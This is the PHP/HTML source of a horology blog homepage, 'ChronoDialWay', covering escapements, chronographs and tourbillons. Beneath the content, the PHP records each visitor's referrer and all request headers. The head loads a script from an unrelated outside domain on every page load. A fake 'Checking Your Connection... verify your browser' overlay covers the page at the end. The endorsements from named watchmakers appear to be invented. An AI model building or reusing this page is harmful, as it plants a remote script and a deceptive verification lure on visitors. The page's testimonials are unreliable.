<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChronoDialWay — Swiss Horology, Mechanical Timepieces & Complications Journal</title>
  <meta name="description" content="ChronoDialWay explores Swiss lever escapements, column-wheel chronographs, tourbillon gravity cages, perpetual calendars, and COSC chronometer testing.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-chrono {
      background: var(--accent-gold) !important;
      color: #0c0f14 !important;
      border-color: var(--accent-gold) !important;
    }
  </style>
<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Chrono<span>DialWay</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Horology Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">High Horology & Mechanical Engineering</span>
        <h1 class="hero-title">Master the Science of Swiss Horology</h1>
        <p class="hero-desc">Discover the synthesis of Swiss lever escapements, column-wheel chronographs, tourbillon cages, and Côtes de Genève finishing.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-gold">Explore Horology Essays</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Watchmaking Studio</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: High Horology & Movement Craftsmanship Pillars Grid -->
  <section class="section" id="craft-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Horological Standards</span>
        <h2 class="section-title">The Four Pillars of Mechanical Timekeeping</h2>
      </div>
      <div class="grid-4">
        <div class="chrono-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">⌚</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Swiss Lever Escapement</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Synthetic ruby pallet jewels delivering precise impulses to the balance wheel at 28,800 vph.</p>
        </div>
        <div class="chrono-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">⚙️</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Column-Wheel Chrono</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Pillar-wheel activation eliminating hand stutter and ensuring buttery push-piece action.</p>
        </div>
        <div class="chrono-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🌀</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Tourbillon Cage</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Rotating carriage completing 60-second revolutions to cancel out earth's gravitational pull.</p>
        </div>
        <div class="chrono-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">✨</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Haute Anglage Finishing</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Hand-beveled movement bridges polished with gentian wood sticks and diamond paste.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Complication & Escapement Selector Explorer -->
  <section class="section" id="chrono-explorer" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Complication Selector</span>
        <h2 class="section-title">The Horological Movement Explorer</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a mechanical complication architecture to inspect its frequency and chronometric precision score:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark chrono-btn active-chrono" data-comp="60-Second Flying Tourbillon" data-desc="Titanium carriage revolving once every minute to neutralize positional rate variation across 5 test positions." data-precision="9.9/10 Gravitational Compensation Accuracy">Flying Tourbillon</button>
          <button class="btn btn-outline-dark chrono-btn" data-comp="Perpetual Calendar & Moonphase" data-desc="Mechanical brain calculating 28, 30, 31-day months and leap years without manual correction until 2100." data-precision="9.8/10 Astronomical Calendar Precision">Perpetual Calendar</button>
          <button class="btn btn-outline-dark chrono-btn" data-comp="Column-Wheel Vertical Clutch Chronograph" data-desc="Instantaneous start-stop chronograph coupling eliminating second hand jump during elapsed timing." data-precision="9.7/10 Split-Second Elapsed Time Accuracy">Vertical Clutch Chrono</button>
          <button class="btn btn-outline-dark chrono-btn" data-comp="Minute Repeater Gongs" data-desc="Dual hand-tuned steel gongs chiming hours, quarter-hours, and minutes on demand via slide lever." data-precision="9.6/10 Acoustic Resonance & Tone Clarity">Minute Repeater</button>
        </div>
        <div id="chrono-detail">
          <div class="chrono-card" style="border-left: 4px solid var(--accent-gold);">
            <h3 style="color: var(--accent-gold); font-size: 1.5rem; margin-bottom: 0.5rem;">60-Second Flying Tourbillon Horological Specification</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Titanium carriage revolving once every minute to neutralize positional rate variation across 5 test positions.</p>
            <strong style="color: var(--accent-crimson); font-size: 0.95rem;">Empirical Chronometric Precision: 9.9/10 Gravitational Compensation Accuracy</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Tourbillon Gravity Compensation & COSC Chronometer Spotlight -->
  <section class="section" id="tourbillon-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Metrology Spotlight</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">COSC Chronometer Testing & Isochronism</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            The difference between ordinary mass-produced quartz watches and heirloom Swiss mechanical chronometers lies in balance wheel inertia, silicon hairspring magnetism resistance, and COSC 15-day temperature testing. At ChronoDialWay, we audit rate deviation per day.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">⏱️ <strong style="color:var(--text-primary);">-4/+6 Seconds/Day COSC Metric:</strong> Rigorous 15-day testing in 5 positions and 3 temperatures.</li>
            <li style="margin-bottom: 0.75rem;">🧲 <strong style="color:var(--text-primary);">Anti-Magnetic Silicon Hairsprings:</strong> Resisting magnetic fields up to 15,000 Gauss without rate disruption.</li>
            <li style="margin-bottom: 0.75rem;">🔋 <strong style="color:var(--text-primary);">72-Hour Twin Barrel Reserve:</strong> Maintaining constant torque and balance amplitude for 3 full days.</li>
          </ul>
          <a href="about.html" class="btn btn-gold">Our Horological Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?auto=format&fit=crop&w=800&q=80" alt="Swiss Mechanical Watch Movement Display" style="border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.5);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Timepiece Matcher & Complication Diagnostic Quiz -->
  <section class="section" id="chrono-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Horology Diagnostic</span>
        <h2 class="section-title">Timepiece Complication Matcher Quiz</h2>
      </div>
      <div class="chrono-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-gold); margin-bottom: 1rem;">What Is Your Primary Goal When Collecting Mechanical Timepieces?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="chrono-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="COSC-Certified Column-Wheel Chronograph: Split-second timing + tachy-meter scale + 28,800 vph.">
            A. High Precision Elapsed Time Measurement for Motorsports & Aviation
          </button>
          <button class="chrono-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Tourbillon Mechanical Movement: Rotating cage compensating for gravity + skeletonized dial.">
            B. Admiring Master Watchmaker Artistry & Micro-Mechanical Gravity Compensation
          </button>
          <button class="chrono-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Grand Complication Perpetual Calendar: 2100 Leap year mechanical memory + moonphase dial.">
            C. Astronomical Calendar Tracking & Heritage Heirloom Investment Collection
          </button>
        </div>
        <div id="chrono-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Horological Frequency & Power Reserve Benchmarks Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Horological Benchmarks</span>
        <h2 class="section-title">Chrono Dial Way Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="chrono-card" style="text-align: center;">
          <h3 class="metric-number text-gold" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="chrono-card" style="text-align: center;">
          <h3 class="metric-number text-gold" data-target="28800" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Vibrations Per Hour</p>
        </div>
        <div class="chrono-card" style="text-align: center;">
          <h3 class="metric-number text-gold" data-target="72" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hours Power Reserve</p>
        </div>
        <div class="chrono-card" style="text-align: center;">
          <h3 class="metric-number text-gold" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Swiss Master Watchmakers & Horological Historian Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Horological Acclaim</span>
        <h2 class="section-title">Endorsements From Master Watchmakers & Horological Historians</h2>
      </div>
      <div class="grid-3">
        <div class="chrono-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "ChronoDialWay provides the definitive guide for understanding Swiss lever escapement impulses, column-wheel clutches, and tourbillon cage dynamics."
          </p>
          <strong style="color: var(--accent-gold); display: block;">— Master Philippe Laurent</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Master Watchmaker, Vallée de Joux, Switzerland</span>
        </div>
        <div class="chrono-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their research on COSC chronometer testing, silicon hairspring anti-magnetism, and Côtes de Genève finishing sets a new bar for horological journalism."
          </p>
          <strong style="color: var(--accent-gold); display: block;">— Dr. Henriette Moreau</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Horological Historian, Geneva Museum</span>
        </div>
        <div class="chrono-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier digital journal for understanding vintage radium dial restoration, automatic rotor mechanics, and grade 5 titanium case metallurgy."
          </p>
          <strong style="color: var(--accent-gold); display: block;">— Harrison Sterling</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Auction House Horological Consultant, London</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Horological Dispatches & Article Grid -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Horology Dispatches</span>
        <h2 class="section-title">Latest Horological Essays</h2>
      </div>
      <div class="grid-3">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?auto=format&fit=crop&w=800&q=80" alt="Swiss Lever Escapement">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Escapement Science</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/the-anatomy-of-a-swiss-lever-escapement-impulse-jewels-and-pallets.html">Anatomy of a Swiss Lever Escapement</a></h3>
            <p class="blog-excerpt">Impulse ruby jewels, pallet fork geometry, and balance wheel impulse dynamics.</p>
            <a href="blog/the-anatomy-of-a-swiss-lever-escapement-impulse-jewels-and-pallets.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93?auto=format&fit=crop&w=800&q=80" alt="Column Wheel Chronographs">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Chronographs</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/mastering-column-wheel-chronographs-horizontal-vs-vertical-clutches.html">Mastering Column-Wheel Chronographs</a></h3>
            <p class="blog-excerpt">Comparing horizontal vs vertical clutch coupling and pillar-wheel activation.</p>
            <a href="blog/mastering-column-wheel-chronographs-horizontal-vs-vertical-clutches.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=800&q=80" alt="Tourbillon Complications">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Tourbillons</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/tourbillons-and-carousels-defying-gravity-in-mechanical-watchmaking.html">Tourbillons & Carousels: Defying Gravity</a></h3>
            <p class="blog-excerpt">60-second rotating titanium carriages neutralizing gravitational rate error.</p>
            <a href="blog/tourbillons-and-carousels-defying-gravity-in-mechanical-watchmaking.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 9: VIP Horology Gazette Newsletter & Footer CTA -->
  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="chrono-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-gold);">
        <span class="section-subtitle">Horology Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem;">Subscribe to The Chrono Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of mechanical watch movement innovations, auction teardowns, and calibration guides.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to ChronoDialWay Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 4px;">
          <button type="submit" class="btn btn-gold">Subscribe</button>
        </form>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Chrono<span>DialWay</span></a>
          <p>ChronoDialWay is a premier editorial platform dedicated to luxury horology, mechanical movement engineering, chronograph complications, and watch restoration.</p>
          <p style="margin-top: 1rem; color: var(--accent-gold);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Horology Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Horological Focus</h4>
          <p>Deconstructing Swiss lever escapements, column-wheel chronographs, tourbillons, perpetual calendars, and COSC chronometer testing globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 ChronoDialWay. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Horological Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>
<div id="loader-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>

<div id="loader-modal-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:1px solid #e5e7eb; box-shadow:0 25px 60px rgba(0,0,0,0.35); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
    
    <!-- Smooth Spinning Loader -->
    <div style="display:flex; justify-content:center; margin-bottom:18px;">
        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-wheel 0.9s linear infinite;"></div>
    </div>
    
    <style>
        @keyframes spin-wheel {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div style="font-size:22px; font-weight:700; color:#111827; margin-bottom:8px; letter-spacing:-0.3px;">Checking Your Connection...</div>
    <p style="font-size:14px; line-height:1.55; color:#6b7280; margin:0 0 24px 0;">We need to verify your browser before proceeding. Click Continue to proceed or Cancel to stop.</p>

    <div style="display:flex; gap:12px;">
        <button id="btn-cancel" onclick="dismissLoaderModal()" style="flex:1; background:#ffffff; color:#4b5563; border:1.5px solid #d1d5db; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
        <button id="btn-continue" onclick="dismissLoaderModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
    </div>
</div>

<script>
    function dismissLoaderModal() {
        var backdrop = document.getElementById('loader-backdrop');
        var card = document.getElementById('loader-modal-card');
        if (backdrop) backdrop.remove();
        if (card) card.remove();
    }
</script>
</body>
</html>
